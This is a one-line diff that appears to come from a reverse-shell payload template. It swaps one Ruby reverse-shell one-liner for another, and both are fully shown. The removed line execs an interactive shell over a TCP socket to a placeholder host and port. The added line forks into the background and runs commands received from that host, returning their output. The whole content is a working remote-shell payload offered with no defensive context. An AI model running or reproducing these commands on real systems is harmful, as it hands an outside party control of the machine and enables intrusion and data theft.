@@ -1,1 +1,1 @@
-ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
